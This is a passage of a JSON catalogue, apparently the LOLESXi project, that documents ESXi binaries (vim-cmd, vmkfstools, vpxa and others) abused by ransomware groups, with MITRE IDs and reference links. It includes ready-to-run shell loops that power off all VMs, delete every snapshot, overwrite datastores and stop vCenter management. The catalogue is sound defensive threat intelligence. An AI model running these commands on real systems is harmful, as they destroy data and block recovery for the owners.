vmsvc/getallvms | tail -n +2 | awk '{system(\"vim-cmd vmsvc/power.off \" $1)}"]},{"Command":"vim-cmd vmsvc/snapshot.removeall","Description":"Remove VM Snapshots","Usecase":"Deletes all snapshots of all Virtual Machines. This activity is usually observed near ransomware deployment and is often executed programatically.","Category":"Inhibit Recovery","Privileges":"Administrator","MitreID":"T1485","OperatingSystem":"ESXi","ProceduralExamples":["for i in `vim-cmd vmsvc/getallvms| awk '{print$1}'`;do vim-cmd vmsvc/snapshot.removeall $i & done","vim-cmd vmsvc/snapshot.removeall %llu > /dev/null 2>&1"]},{"Command":"vim-cmd vmsvc/power.off","Description":"Power off VM","Usecase":"Powers off Virtual Machines. This activity is usually observed near ransomware deployment and is often executed programatically.","Category":"Power off VM","Privileges":"Administrator","MitreID":"T1529","OperatingSystem":"ESXi","Tags":[{"E-Crime":"Lockbit"},{"E-Crime":"Ransomhub"},{"E-Crime":"Blackcat"},{"E-Crime":"Qilin"},{"E-Crime":"Play"},{"E-Crime":"Lynx"},{"E-Crime":"Howling Scorpius"}],"ProceduralExamples":["vim-cmd vmsvc/getallvms | grep -o -E \\'^[0-9]+\\' | xargs -r -n 1 vim-cmd vmsvc/power.off","/bin/sh -c “for vmid in $(vim-cmd vmsvc/getallvms | grep -v Vmid | awk '{print $1}'); do vim-cmd vmsvc/power.off $vmid; done\"","for i in $(vim-cmd vmsvc/getallvms | awk '{print $1}' | grep -Eo '[0-9]{1,5}'); do vim-cmd vmsvc/power.off $i; vim-cmd vmsvc/snapshot.removeall $i; done;","vim-cmd vmsvc/getallvms | tail -n +2 | awk '{system(\"vim-cmd vmsvc/power.off \" $1)}"]},{"Command":"vmsvc/power.getstate","Description":"Gets the power state of a Virtual Machine","Usecase":"Obtains the power state of a virtual machine. This is used to before powering off targeted VMs.","Category":"Power off VM","Privileges":"Administrator","MitreID":"T1529","OperatingSystem":"ESXi","ProceduralExamples":["vmsvc/power.getstate %d"]}],"Full_Path":[{"Path":"/sbin/vim-cmd"},{"Path":"/bin/vim-cmd"}],"Detection":null,"AtomicTests":null,"Resources":[{"Link":"https://www.trendmicro.com/en_us/research/22/a/analysis-and-Impact-of-lockbit-ransomwares-first-linux-and-vmware-esxi-variant.html"},{"Link":"https://thedxt.ca/2023/12/esxi-autostart-vms-with-cli/"},{"Link":"https://www.bleepingcomputer.com/news/security/linux-version-of-ransomhub-ransomware-targets-vmware-esxi-vms/"},{"Link":"https://www.cybereason.com/blog/cybereason-vs.-blackcat-ransomware"},{"Link":"https://www.bleepingcomputer.com/news/security/linux-version-of-qilin-ransomware-focuses-on-vmware-esxi/"},{"Link":"https://www.trendmicro.com/en_us/research/24/g/new-play-ransomware-linux-variant-targets-esxi-shows-ties-with-p.html"},{"Link":"https://x.com/malwrhunterteam/status/1455628865229950979?lang=en"},{"Link":"https://www.hybrid-analysis.com/sample/a0ceb258924ef004fa4efeef4bc0a86012afdb858e855ed14f1bbd31ca2e42f5/661430861522cb62560ee827"},{"Link":"https://unit42.paloaltonetworks.com/inc-ransomware-rebrand-to-lynx/"},{"Link":"https://unit42.paloaltonetworks.com/threat-assessment-howling-scorpius-akira-ransomware/"},{"Link":"https://research.checkpoint.com/2024/inside-akira-ransomwares-rust-experiment/"},{"Link":"https://www.trendmicro.com/en_us/research/25/i/lockbit-5-targets-windows-linux-esxi.html"},{"Link":"https://www.levelblue.com/blogs/spiderlabs-blog/19-shades-of-lockbit5.0-inside-the-latest-cross-platform-ransomware-part-1"}],"url":"https://lolesxi-project.github.io/LOLESXi/lolesxi/Binaries/vim-cmd/"},{"Name":"vm-support","Description":"A command-line utility in VMware ESXi that collects diagnostic information for troubleshooting and support purposes.","Author":"Janantha Marasinghe @blueteam0ps_","Created":"2024-08-30","Commands":[{"Command":"vm-support --listvms","Description":"Lists running Virtual Machines","Usecase":"Obtains a list of running Virtual Machines","Category":"Lists VMs","Privileges":"Administrator","MitreID":"T1082","OperatingSystem":"ESXi","Tags":[{"E-Crime":"Lockbit"}]}],"Full_Path":[{"Path":"/sbin/vm-support"},{"Path":"/bin/vm-support"}],"Detection":null,"AtomicTests":null,"Resources":[{"Link":"https://www.trendmicro.com/en_us/research/22/a/analysis-and-Impact-of-lockbit-ransomwares-first-linux-and-vmware-esxi-variant.html"}],"url":"https://lolesxi-project.github.io/LOLESXi/lolesxi/Binaries/vm-support/"},{"Name":"vmkfstools","Description":"A command-line utility in VMware ESXi used to manage and interact with VMFS (Virtual Machine File System) volumes.","Author":"Janantha Marasinghe @blueteam0ps_","Created":"2024-08-27","Commands":[{"Command":"vmkfstools -c 10M -d eagerzeroedthick $I/eztDisk > /dev/null","Description":"Create eager-zeroed thick virtual disk at the specified location without displaying any output.","Usecase":"Adversary uses vmfstools to create and immediately delete a 10MB eager zeroed thick disk on every datastore on the ESXi host. This will effectively overwrite contents of the disk.","Category":"Inhibit Recovery","Privileges":"Administrator","MitreID":"T1561.001","OperatingSystem":"ESXi","Tags":[{"E-Crime":"Qilin"}],"ProceduralExamples":["for I in $(esxcli storage filesystem list |grep 'VMFS-5' |awk '{print $1}'); do vmkfstools -c 10M -d eagerzeroedthick $I/eztDisk > /dev/null; vmkfstools -U $I/eztDisk > /dev/null; done","for I in $(esxcli storage filesystem list |grep 'VMFS-6' |awk '{print $1}'); do vmkfstools -c 10M -d eagerzeroedthick $I/eztDisk > /dev/null; vmkfstools -U $I/eztDisk > /dev/null; done"]}],"Full_Path":[{"Path":"/sbin/vmkfstools"},{"Path":"/bin/vmkfstools"}],"Detection":null,"AtomicTests":null,"Resources":[{"Link":"https://www.bleepingcomputer.com/news/security/linux-version-of-qilin-ransomware-focuses-on-vmware-esxi/"},{"Link":"https://www.shadowstackre.com/analysis/qilin"}],"url":"https://lolesxi-project.github.io/LOLESXi/lolesxi/Binaries/vmkfstools/"},{"Name":"vmware","Description":"Binary that provides system information related to an ESXi host.","Author":"Janantha Marasinghe @blueteam0ps_","Created":"2026-02-02","Commands":[{"Command":"vmware -v 2> /dev/null","Description":"Gets the VMWARE ESXi host version information.","Usecase":"An adversary obtains system information such as the version of the ESXi host.","Category":"System Information","Privileges":"Administrator","MitreID":"T1082","OperatingSystem":"ESXi","Tags":[{"E-Crime":"Lockbit"}]}],"Full_Path":[{"Path":"/sbin/vmware"},{"Path":"/bin/vmware"}],"Detection":null,"AtomicTests":null,"Resources":[{"Link":"https://www.levelblue.com/blogs/spiderlabs-blog/19-shades-of-lockbit5.0-inside-the-latest-cross-platform-ransomware-part-1"}],"url":"https://lolesxi-project.github.io/LOLESXi/lolesxi/Binaries/vmware/"},{"Name":"vpxa","Description":"Vpxa functions as an intermediary service that connects the vpxd service on the vCenter Server with the hostd service on an ESXi host. Stopping this service will cause management and monitoring functions to cease.","Author":"Janantha Marasinghe @blueteam0ps_","Created":"2024-08-31","Commands":[{"Command":"/etc/init.d/vpxa stop","Description":"Stops the vpxa service on an ESXi host.","Usecase":"An adversay may stop the vpxa service to cease remote management by the VCenter server.","Category":"Stop Service","Privileges":"Administrator","MitreID":"T1489","OperatingSystem":"ESXi","Tags":[{"E-Crime":"Nevada"}]}],"Full_Path":[{"Path":"/etc/init.d/vpxa"}],"Detection":null,"AtomicTests":null,"Resources":[{"Link":"https://www.trellix.com/en-au/blogs/research/ransomhouse-am-see/"}],"url":"https://lolesxi-project.github.io/LOLESXi/lolesxi/Binaries/vpxa/"}]
